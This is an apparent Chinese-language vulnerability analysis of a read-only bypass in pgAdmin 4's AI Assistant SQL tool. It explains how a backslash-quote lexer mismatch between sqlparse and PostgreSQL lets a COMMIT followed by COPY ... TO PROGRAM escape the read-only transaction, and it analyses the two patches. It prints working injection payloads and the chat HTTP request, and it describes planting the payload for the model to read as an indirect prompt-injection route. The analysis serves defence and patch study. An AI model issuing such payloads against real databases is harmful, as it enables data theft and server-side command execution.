# pgAdmin AI Assistant：sqlparse 当只读门卫，PostgreSQL 按另一套引号规则执行

- Case：`PCBV2-0166`
- 产品：pgAdmin 4（官方镜像 `dpage/pgadmin4`）。入口是已登录的 NLQ 聊天：`POST /sqleditor/nlq/chat/<trans_id>/stream`。LLM 工具 `execute_sql_query` 在只读事务里跑模型给出的 SQL。
- 链：CVE-2026-12045（9.15 → 9.16，commit `bf47924`，`sqlparse` 单语句 + 关键字白名单）→ CVE-2026-17351（GHSA-v5gm-27gp-4f7w，9.16 → 9.17，commit `ef76102`，`prepare_threshold=0` 强迫扩展协议）。CVE 原文写明 17351 是 12045 的不完全修复。
- 源码对着 tag `REL-9_16` 的 `web/pgadmin/llm/tools/database.py`。V0 是镜像 `9.15`。V2 是 `9.17`。

9.16 要求 LLM 提交的查询经 sqlparse 只能是一条 SELECT/WITH/EXPLAIN/SHOW/VALUES/TABLE，再放进 `BEGIN TRANSACTION READ ONLY`。sqlparse 把反斜杠当字符串转义；PostgreSQL 在 `standard_conforming_strings=on`（9.1 起默认）里把 `\'` 当普通字符。`SELECT '\';COMMIT;…` 在门卫眼里是一条 SELECT，在引擎里是四条语句。NVD / GHSA 把这件事记成 CVE-2026-17351。

根因不只是「正则/解析器写窄了」。检查插在 **Python 词法**上；真正执行的是随后 `conn.execute_2darray(query)` 走的 PostgreSQL **简单查询协议**。psycopg3 的 `prepare=True` 在 `prepare_threshold is None`（pgAdmin 默认）时会被静默忽略——更强的「让服务器 Parse 拒多语句」就在旁边，V1 没用上。下面按聊天请求走进去。

---

## 这块功能本来在干什么

pgAdmin 9.13+ 的 AI Assistant 把自然语言交给 LLM，模型再调 `execute_sql_query`。工具在独立连接上：

1. （V1）校验 SQL
2. `BEGIN TRANSACTION READ ONLY`
3. 执行用户/模型给的语句
4. 回滚

一次典型已登录请求（本 case 用 mock OpenAI sidecar，把用户消息原样填进 tool 的 `query`，不让模型「发明」payload）：

```http
POST /sqleditor/nlq/chat/<trans_id>/stream
Cookie: <登录会话>
{"message":"COMMIT;COPY (SELECT secret FROM pcb_secret) TO PROGRAM 'cat > /tmp/pcb_result.txt';SELECT 1 --", ...}
```

前置：登录 → 注册服务器 → `initialize_sqleditor` 拿到 trans_id。设计意图：模型只能只读查询当前库。成功穿越之后的效果是 **`COMMIT` 结束只读事务，随后的 `COPY … TO PROGRAM` 在 autocommit 下由超级用户跑起来**，把 `pcb_secret` 写到 PostgreSQL 容器的 `/tmp/pcb_result.txt`。

数据流：

```text
HTTP message
    → NLQ chat / tool dispatcher
         execute_readonly_query(sid, did, query)
              V1：_validate_readonly_query(query)     ← sqlparse
              开只读连接
              BEGIN TRANSACTION READ ONLY
              conn.execute_2darray(query)             ← 简单协议，可多语句
    → PostgreSQL
```

需要登录，以及能让 Assistant 连上的服务器。COPY TO PROGRAM 需要 `pg_execute_server_program` / 超级用户——本 case sidecar 就是这样配的。间接投毒（把 payload 种进模型可能读到的对象）是 advisory 写的另一条投递；本 case 直接把 payload 当 message，mock 原样转成 tool 参数。

---

## 原始漏洞：只读包装挡不住 COMMIT（CVE-2026-12045，9.15）

V0 没有 `_validate_readonly_query`。`execute_2darray` 把整段文本交给简单查询协议。PostgreSQL 按分号执行：

```text
BEGIN TRANSACTION READ ONLY   -- 工具自己发的
COMMIT;                       -- 用户语句第一条：结束只读事务
COPY (SELECT secret FROM pcb_secret) TO PROGRAM 'cat > /tmp/pcb_result.txt';
SELECT 1 --
```

`COMMIT` 之后会话回到 autocommit，`COPY TO PROGRAM` 写文件。这就是 v0 + `--seed`。`ROLLBACK` 若出现在用户语句末尾，只读包装的收尾变成空操作。

---

## 维护者改了什么（CVE-2026-12045，9.16 / bf47924）

V1 在任何连接工作之前插入校验。`REL-9_16` 原文：

```python
# web/pgadmin/llm/tools/database.py  (REL-9_16)
_ALLOWED_LEADING_KEYWORDS = frozenset({
    'SELECT', 'WITH', 'EXPLAIN', 'SHOW', 'VALUES', 'TABLE',
})

def _validate_readonly_query(query: str) -> None:
    parsed = sqlparse.parse(query)
    statements = [
        s for s in parsed
        if s.token_first(skip_cm=True, skip_ws=True) is not None
    ]
    if len(statements) > 1:
        raise DatabaseToolError(
            "Only a single SQL statement is allowed; ...")
    keyword = _first_real_keyword(statements[0])
    if keyword not in _ALLOWED_LEADING_KEYWORDS:
        raise DatabaseToolError(...)
```

`execute_readonly_query` 一进函数就调它。对 seed：sqlparse 看到两条以上语句，`len(statements) > 1` 直接拒绝，根本不会去看关键字。对 residual：`statements` 长度为 1，才走到 `_first_real_keyword`。该函数跳过空白、注释、标点，取第一个 `normalized` 关键字并 `.upper()`。sqlparse 若把 `COMMIT` 留在字符串 token 里，第一个关键字就是 `SELECT`，白名单放行。威胁模型注释写明要拦的是 `COMMIT/END/ROLLBACK/ABORT` 打头的语句——前提是 sqlparse **看得见** 它们是语句，而不是字符串内容。

`execute_readonly_query` 在校验之后才 `_connect_readonly`。V1 的连接函数开只读事务，不改 `prepare_threshold`。所以「校验用 Python、执行用简单协议」是同一条函数链上前后相邻的两步，不是两个模块。

补丁默认了两件事：

1. sqlparse 的语句切分 / 字符串词法等于 PostgreSQL。
2. 通过校验之后，把同一字符串交给 `execute_2darray` 是安全的，因为只读事务还在。

第一点在 `\'` 上不成立。

---

## 校验之后，字符串怎么接到 PostgreSQL 上

V1 谓词一结束，同一模块：

```python
def _execute_readonly_query(conn, query: str) -> dict:
        status, result = conn.execute_void("BEGIN TRANSACTION READ ONLY")
        ...
        status, result = conn.execute_2darray(query)   # 无 prepare=
```

`execute_2darray` 默认走简单查询协议（pgAdmin 连接的 `prepare_threshold` 为 None）。过滤器看过的是 sqlparse 的 token 流；服务器看到的是另一套 lexer。中间没有「用 PostgreSQL Parse 再验一次」的谓词。

sqlparse 把 `\'` 当转义，于是

```text
SELECT '\';COMMIT;COPY (SELECT secret FROM pcb_secret) TO PROGRAM 'cat > /tmp/pcb_result.txt';SELECT 1 LIMIT 1 --'
```

在 sqlparse 里是**一条** SELECT：字符串从 `'` 开始，反斜杠吃掉中间的引号，直到 `--` 前那个收尾引号。`_first_real_keyword` 得到 `SELECT`，放行。

PostgreSQL（`standard_conforming_strings=on`）里反斜杠不是转义，第一个 `'` 在 `\` 之后立刻结束字符串，后面的 `COMMIT;` 是真语句。LIMIT 还让 pgAdmin 的 `max_rows` 包装失效。四条语句：SELECT 残片、COMMIT、COPY TO PROGRAM、SELECT。只读事务被结束，COPY 写 flag 文件。

---

## 仓库里已经有更强的检查，执行路径没用

| 能力 | V1 用了吗 |
|---|---|
| sqlparse 单语句 + 关键字 | 是，在执行前 |
| `BEGIN TRANSACTION READ ONLY` | 是，在执行前 |
| `SET SESSION CHARACTERISTICS AS TRANSACTION READ ONLY` | 否（V2 才加，纵深） |
| psycopg `execute(..., prepare=True)` → 扩展协议，服务器拒多语句 | 否；且即便加上，默认 `prepare_threshold=None` 时 **会被忽略** |
| 参数绑定 / 不允许拼整段 SQL | 否，工具的语义就是跑任意只读 SQL |

CVE-2026-17351 把「只加 `prepare=True`」写成一次失败的候选修丁：*psycopg3's PrepareManager silently ignores the prepare argument whenever the connection's prepare_threshold is None, which is pgAdmin's default*。更强的谓词不是再调优 sqlparse，而是让 **PostgreSQL 自己的 Parse** 拒绝多命令。V1 停在 Python lexer。

`COPY … TO PROGRAM` 能写 `/tmp/pcb_result.txt`，是因为 sidecar 角色有 `pg_execute_server_program`（超级用户默认有）。只读逃逸在权限更低的角色上仍能 `COMMIT` 之后跑 `INSERT`/`UPDATE`；本 case 用 COPY 当效果通道，不表示 residual 只能 RCE。`pcb_secret` 由 postgres entrypoint 从 `$PCB_FLAG` 插入，不在 pgAdmin 应用代码里。

NLQ 路由在 sqleditor 蓝图下，自身有 `@pga_login_required`（和 0165 的 close 不同）。17351 不是未登录，是**已登录用户**通过 Assistant 把校验过的字符串交给简单协议。0165 和 0166 都是 pgAdmin 9.16 上的不完全修复，但一条是装饰器覆盖面，一条是 SQL 词法分歧，不要并成同一个洞。

---

## 这个补丁挡住了什么、没挡住什么

- `_validate_readonly_query`：sqlparse 看到几条语句、首关键字是什么
- `execute_2darray`：PostgreSQL 简单协议执行什么

明文 `COMMIT;COPY…` 被第一层挡住。`SELECT '\';COMMIT;COPY…` 在第一层是一条 SELECT，第二层仍是四条。advisory 给的例子是 `SELECT '\';COMMIT;CREATE TABLE pwn(x int);SELECT 1 --'`；本 case 把 CREATE 换成 COPY TO PROGRAM 读金丝雀，同一条只读逃逸。

---

## 残余仍然走同一条 execute_sql_query（CVE-2026-17351）

没有换工具、没有换聊天路由、没有换连接用户。还是：

```text
message = SELECT '\';COMMIT;COPY (SELECT secret FROM pcb_secret) TO PROGRAM 'cat > /tmp/pcb_result.txt';SELECT 1 LIMIT 1 --'
```

`_validate_readonly_query` 放行；`BEGIN TRANSACTION READ ONLY` 照开；简单协议执行四条；`/tmp/pcb_result.txt` 出现 `PCBFLAG_...`。seed 被挡住只说明「字面多语句没了」，不说明「不能再结束只读事务」。

---

## 后来又补了什么（CVE-2026-17351，9.17 / ef76102）

V2 在只读专用连接上：

```python
    if getattr(conn, 'conn', None) is not None:
        conn.conn.prepare_threshold = 0
    conn.execute_void(
        "SET SESSION CHARACTERISTICS AS TRANSACTION READ ONLY")
    ...
    status, result = conn.execute_2darray(query, prepare=True)
```

`prepare_threshold=0` 强迫扩展协议，PostgreSQL Parse 对多命令返回 `cannot insert multiple commands into a prepared statement`。COPY 不会跑。建议升到 9.17。sqlparse 仍留着当第一层；闭合靠的是服务器协议，不是把 sqlparse 教成 PostgreSQL。

advisory 专门写了一次**失败的候选修丁**：只把 `execute_2darray(query)` 改成 `execute_2darray(query, prepare=True)`，不改 `prepare_threshold`。psycopg3 在 `prepare_threshold is None` 时忽略 per-call 的 `prepare`，连接仍走简单协议，residual 原样执行。pgAdmin 每个服务器的「Prepare threshold」字段默认为空，也就是这个 None。所以「让 PostgreSQL Parse 拒多语句」必须写到**这条只读专用连接**上，不能指望管理员去改 UI。V2 的 `conn.conn.prepare_threshold = 0` 正是补上这个空操作。

`SET SESSION CHARACTERISTICS AS TRANSACTION READ ONLY` 是纵深：即便有人再找到结束当前事务的办法，会话默认仍是只读。它挡不住已经 `COMMIT` 再 `COPY` 的简单协议批——那发生在 SET 之后、且 COMMIT 会清掉事务特性——真正闭合多语句的仍是扩展协议。

---

## 从这条链还能看出什么

**维护者改错了哪一层。**  
他们改的是 Python 里对文本的分类。真正能 `COMMIT` 的是简单协议。V2 把执行换成 Parse，才对准消费者。

**不是没有更好的谓词。**  
扩展协议就在 psycopg 里；V1 默认配置让 `prepare=True` 变成空操作。从 bf47924 只能看到 sqlparse；要判断闭合，必须看 `execute_2darray` 走哪条协议，以及 `\'` 在两边 lexer 里的分歧。

**同一工具、同一 query 参数，只换了引号写法。**  
任何能让 Assistant 发出 tool call 的投递（直接 message 或间接 prompt injection），在 9.16 上都吃这一套。

**两个 lexer 对 `\'` 的对照。**

| | sqlparse（V1 门卫） | PostgreSQL `standard_conforming_strings=on` |
|---|---|---|
| `'` 开始字符串 | 是 | 是 |
| `\'` | 转义，字符串继续 | 普通 `\` + **结束字符串** |
| 随后的 `COMMIT;` | 仍在字符串里 | 真语句 |

V1 用左边那一列决定放不放行；`execute_2darray` 用右边那一列执行。`standard_conforming_strings` 从 PG 9.1 起默认 on，pgAdmin 连的现代服务器几乎都是这个模式。

**`LIMIT` 不是注入，是关掉包装。**  
9.16 会给只读 SELECT 加 `max_rows` 限制。语句里已有 `LIMIT` 时包装不套。residual 带 `LIMIT 1` 是为了让 COPY 所在的批按原样执行，不是第二条独立洞。

**mock LLM 只是把 message 填进 tool。**  
分析的是 `execute_readonly_query`，不是模型是否「愿意」发 COMMIT。advisory 的间接投毒（把 payload 种进模型可能读到的对象）走同一工具、同一校验、同一 `execute_2darray`。

**9.16 上两段 query 对照。**

```text
# seed
COMMIT;COPY (SELECT secret FROM pcb_secret) TO PROGRAM '…';SELECT 1 --
sqlparse.parse → 多条 → DatabaseToolError（连接不开）

# residual
SELECT '\';COMMIT;COPY (SELECT secret FROM pcb_secret) TO PROGRAM '…';SELECT 1 LIMIT 1 --'
sqlparse.parse → 1 条，keyword=SELECT → 放行
BEGIN TRANSACTION READ ONLY
execute_2darray（简单协议）→ PG 执行 4 条 → COPY 写 /tmp/pcb_result.txt
```

同一 `execute_readonly_query`、同一只读包装。差别只是 sqlparse 能不能在 `\'` 上把 `COMMIT` 看成语句。

---

## 版本、入口、参考

---

## 版本、入口、参考

| | 镜像 | 校验 | 执行 | 明文 COMMIT;COPY seed | `SELECT '\';COMMIT;COPY` residual |
|---|---|---|---|---|---|
| V0 | 9.15 | 无 | 简单协议 | COPY 写 flag | （不必） |
| V1 | 9.16 | sqlparse 单语句+关键字 | 仍简单协议 | 校验拒绝 | 校验当一条 SELECT，COPY 写 flag |
| V2 | 9.17 | 同上 | `prepare_threshold=0` | 挡 | Parse 拒多命令 |

- HTTP：`POST /sqleditor/nlq/chat/<trans_id>/stream`
- [CVE-2026-12045](https://nvd.nist.gov/vuln/detail/CVE-2026-12045)、[CVE-2026-17351](https://nvd.nist.gov/vuln/detail/CVE-2026-17351)
- [GHSA-v5gm-27gp-4f7w](https://github.com/advisories/GHSA-v5gm-27gp-4f7w)
- V1：[database.py @ REL-9_16](https://github.com/pgadmin-org/pgadmin4/blob/REL-9_16/web/pgadmin/llm/tools/database.py)
- V2：commit [ef76102](https://github.com/pgadmin-org/pgadmin4/commit/ef76102)
